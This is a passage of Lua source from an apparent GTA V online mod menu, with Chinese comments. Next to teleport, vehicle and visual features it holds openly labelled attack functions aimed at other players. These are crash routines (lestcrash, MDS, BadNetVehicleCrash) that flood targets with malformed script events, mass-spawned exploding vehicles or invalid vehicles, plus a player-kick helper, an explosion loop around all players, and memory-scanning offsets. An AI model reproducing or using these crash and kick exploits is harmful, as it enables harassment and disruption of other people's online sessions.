                success, ground_z = util.get_ground_z(wppos.x, wppos.y)
                util.yield()
            until success
            if not PED.IS_PED_IN_ANY_VEHICLE(localped, true) then
                ENTITY.SET_ENTITY_COORDS(localped, wppos.x, wppos.y, ground_z, false, false, false, false) 
            else
                local veh = PED.GET_VEHICLE_PED_IS_IN(localped, false)
                local v3Out = memory.alloc()
                local headOut = memory.alloc()
                PATHFIND.GET_CLOSEST_VEHICLE_NODE_WITH_HEADING(wppos.x, wppos.y, ground_z, v3Out, headOut, 1, 3.0, 0)
                local head = memory.read_float(headOut)
                memory.free(headOut)
                memory.free(v3Out)
                ENTITY.SET_ENTITY_COORDS(veh, wppos.x, wppos.y, ground_z, false, false, false, false)
                ENTITY.SET_ENTITY_HEADING(veh, head)
            end
            wait()
            local pc2 = getEntityCoords(getPlayerPed(players.user()))
            local coordDiffz = CAM.GET_CAM_COORD(CCAM).z - ground_z -2
            local camcoordz = CAM.GET_CAM_COORD(CCAM).z
          
            for i = 0, 1, STP_SPEED_MODIFIER / 2 do
                local pc23 = getEntityCoords(getPlayerPed(players.user()))
                CAM.SET_CAM_COORD(CCAM, pc23.x, pc23.y, camcoordz - (EaseOutCubic(i) * coordDiffz))
                wait()
            end
    
            wait()
    
            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, true, 0)
            if CAM.IS_CAM_ACTIVE(CCAM) then
                CAM.SET_CAM_ACTIVE(CCAM, false)
            end
            CAM.DESTROY_CAM(CCAM, true)
        else
            util.toast("没标点！")
        end
    end
    function elqs()
        vehicleelqs = CreateVehicle (1491277511,ENTITY.GET_ENTITY_COORDS(players.user_ped(),false),0,true)
        ENTITY.SET_ENTITY_RENDER_SCORCHED(vehicleelqs,true)
        VEHICLE.SET_VEHICLE_COLOURS(vehicleelqs,147,147)
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vehicleelqs,30,15)
        PED.SET_PED_INTO_VEHICLE(players.user_ped(),vehicleelqs,-1)
        util.yield(500)
        request_ptfx_asset(burning_man_ptfx_asset)
                for _, boneName in pairs({"wheel_lf", "wheel_lr"}) do
        GRAPHICS.USE_PARTICLE_FX_ASSET(burning_man_ptfx_asset)
                    local bone_id = ENTITY.GET_ENTITY_BONE_INDEX_BY_NAME(vehicleelqs, boneName)
                    fx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(burning_man_ptfx_effect, vehicleelqs, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, bone_id, 0.9, false, false, false, 0, 0, 0, 0)
                    looped_ptfxs[#looped_ptfxs+1] = fx
                    GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fx, 100, 100, 100, false)
              end
        end
function zcndxz(state)
    nt = state
    warehouse_scaleform = GRAPHICS.REQUEST_SCALEFORM_MOVIE("WAREHOUSE")
    while nt do
        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(warehouse_scaleform, "SHOW_OVERLAY")
        GRAPHICS.DRAW_SCALEFORM_MOVIE_FULLSCREEN(warehouse_scaleform, 200, 200, 200, 200, 0)
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("喜不喜欢夜幕Lua？")
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("请选择以下选项之一")
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("灰常喜欢！")
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING("炒鸡喜欢！")
        GRAPHICS.END_SCALEFORM_MOVIE_METHOD(warehouse_scaleform)
        util.yield()
     end
end
------------喷射
function request_ptfx_asset_peeloop(asset)
    STREAMING.REQUEST_NAMED_PTFX_ASSET(asset)

    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED(asset) do
        util.yield()
    end
end
function announce(string)
    if announce_actions then
        util.toast(string)
    end
end
function get_vehicle_ped_is_in(ped, includeLastVehicle)
    if includeLastVehicle or PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
        return PED.GET_VEHICLE_PED_IS_IN(ped, false)
    end
    return 0
end
function repair_player_vehicle(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, include_last_vehicle_for_player_functions)
        if player_vehicle == 0 then
            util.toast("夜幕提醒:玩家不在车里.")
        else
            if request_control(player_vehicle) then
                VEHICLE.SET_VEHICLE_FIXED(player_vehicle)
                announce("夜幕提醒:已修复!")
            else
                util.toast("夜幕提醒:无法控制车辆.")
            end
        end
end
--喇叭加速
function remote_horn_boost(pid)
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local player_vehicle = get_vehicle_ped_is_in(player_ped, false)
        if AUDIO.IS_HORN_ACTIVE(player_vehicle) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(player_vehicle)
            ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(player_vehicle, 1, 0.0, 1.0, 0.0, true, true, true, true) -- alternatively, VEHICLE.SET_VEHICLE_FORWARD_SPEED(...) -- not tested
        end
end
--莱纳斯崩溃
function lestcrash(PlayerID)
    local int_min = -2147483647
    local int_max = 2147483647
    for i = 1, 150 do
    util.trigger_script_event(1 << PlayerID, {2765370640, PlayerID, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
    math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
    math.random(int_min, int_max), PlayerID, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
end
util.yield()
    for i = 1, 15 do
    util.trigger_script_event(1 << PlayerID, {1348481963, PlayerID, math.random(int_min, int_max)})
    end
menu.trigger_commands("givesh " .. players.get_name(PlayerID))
util.yield(100)
util.trigger_script_event(1 << PlayerID, {495813132, PlayerID, 0, 0, -12988, -99097, 0})
util.trigger_script_event(1 << PlayerID, {495813132, PlayerID, -4640169, 0, 0, 0, -36565476, -53105203})
util.trigger_script_event(1 << PlayerID, {495813132, PlayerID,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
end
---董哥崩溃
function dongge(PlayerID)
            util.toast("I'll try to convince them to leave :) ")
                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
                util.yield(20)
                local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
                TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
                util.yield(500)
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
                util.yield(1000)
                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
                TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
end


--美杜莎崩溃
function MDS(PlayerID)
    menu.trigger_commands("anticrashcam on")
    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
	local plauuepos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    plauuepos.x = plauuepos.x + 5
    plauuepos.z = plauuepos.z + 5
    local hunter = {}
    for i = 1 ,3 do
        for n = 0,120 do
            hunter[n] = CreateVehicle(1077420264,plauuepos,0)
            util.yield(0)
            ENTITY.FREEZE_ENTITY_POSITION(hunter[n],true)
            util.yield(0)
            VEHICLE.EXPLODE_VEHICLE(hunter[n], true, true)
        end
        util.yield(190)
        for i = 1,#hunter do
            if hunter[i] ~= nil then
                entities.delete_by_handle(hunter[i])
            end
        end
    end
    notification( "崩溃完成", colors.black)
	menu.trigger_commands("anticrashcam off")
    hunter = nil
    plauuepos = nil	
end
--3D射线
function request_texture_dict_load(dict_name)
    request_time = os.time()
    GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(dict_name, true)
    while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(dict_name) do
        if os.time() - request_time >= 10 then
            break
        end
        util.yield()
    end
end
----升级载具
function upgrade_vehicle(vehicle)
    for i = 0, 49 do
        local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
    end
end
function request_control_of_entity(ent, time)
    if ent and ent ~= 0 then
        local end_time = os.clock() + (time or 3)
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and os.clock() < end_time do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
            util.yield()
        end
        return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
    end
    return false
end
replayInterface = memory.read_long(memory.rip(memory.scan("48 8D 0D ? ? ? ? 48 8B D7 E8 ? ? ? ? 48 8D 0D ? ? ? ? 8A D8 E8 ? ? ? ? 84 DB 75 13 48 8D 0D") + 3))
pedInterface = memory.read_long(replayInterface + 0x0018)
vehInterface = memory.read_long(replayInterface + 0x0010)
objectInterface = memory.read_long(replayInterface + 0x0028)
function shitixianshi(state)
            draw_string(string.format("~h~~p~夜幕~"..memory.read_int(pedInterface ).."/"..memory.read_int(pedInterface)), 0,0, 0.4,1)
            draw_string(string.format("~h~~w~PED ~m~  : ~b~"..memory.read_int(pedInterface + 0x0110).."/"..memory.read_int(pedInterface + 0x0108)), 0,0.03, 0.35,1)
            draw_string(string.format("~h~~w~载具 ~m~  : ~b~"..memory.read_int(vehInterface + 0x0190).."/"..memory.read_int(vehInterface + 0x0188)), 0,0.06, 0.35,1)
            draw_string(string.format("~h~~w_battle_airmissile_01~实体 ~m~  : ~b~"..memory.read_int(objectInterface + 0x0168).."/"..memory.read_int(objectInterface + 0x0160)), 0,0.09, 0.35,1)
			end		
local explosion_circle_angle = 0
function explosion_circle(ped, angle, radius)
    local ped_coords = ENTITY.GET_ENTITY_COORDS(ped)

    local offset_x = ped_coords.x
    local offset_y = ped_coords.y

    local x = offset_x + radius * math.cos(angle)
    local y = offset_y + radius * math.sin(angle)

    FIRE.ADD_EXPLOSION(x, y, ped_coords.z, 4, 1, true, false, 0)
end
--爆炸圈
function baozhanquan()
for k,v in pairs(players.list(true, true, true)) do
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
            explosion_circle(ped, explosion_circle_angle, 25)
        end

        explosion_circle_angle += 0.15
        util.yield(50)
    end

local selectedOpt = 1
options_force  = {"摧毁"}
function forcefielddd()
    if selectedOpt == 1 then
		set_explosion_proof(players.user_ped(), true)
		local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
		FIRE.ADD_EXPLOSION(pos.x,pos.y,pos.z, 29, 5.0, false, true, 0.0, true)
	end
end
function forcefield_set(index)
    selectedOpt = index
end
--踢出
function KickPlayer(PlayerID, method)
    local path = menu.player_root(PlayerID)
    local command = menu.ref_by_rel_path(path, "Kick>"..method)
    menu.trigger_command(command)
end
--无效载具v1
function BadNetVehicleCrash(PlayerID)
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(PlayerID))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(PlayerID))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                util.yield()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
    wait(2000)
    menu.trigger_commands("explode" ..  players.get_name(PlayerID))
    util.toast("已完成.")
    for _, v in pairs(vehicles) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(v)
        entities.delete_by_handle(v)
    end
end